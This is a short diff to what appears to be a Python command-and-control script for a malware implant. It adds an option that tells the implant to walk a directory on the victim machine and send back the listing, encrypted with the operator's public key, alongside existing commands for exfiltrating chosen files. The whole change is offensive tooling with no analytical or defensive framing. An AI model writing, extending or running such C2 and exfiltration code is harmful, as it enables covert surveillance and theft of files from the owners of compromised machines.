@@ -84,7 +84,7 @@ while(True):
         #Listen for the Responses
         c2_socket.listen(1)
         while(True):
-            print("Press 'n' to end, 'a' to add an exfil path, any other key to continue")
+            print("Press 'n' to end, 'a' to add an exfil path, 'w' to do an oswalk, any other key to continue")
             c = input(">>").lower()
             if(c == 'n'):
                 break
@@ -92,6 +92,11 @@ while(True):
                 print("Enter the absolute path to the file to add")
                 path = input(">>")
                 send_implant('2a' + ";" + path)
+            elif(c == 'w'):
+                print("Enter the absolute path to the directory to walk")
+                directory = input(">>")
+                send_implant('2w' + ';' + directory + ';' + str(pubkey.n) + ';' + str(pubkey.e))
+                recieve_exfil()
             else:
                 print("Exfil initiated")
                 #Send command to exfiltrate
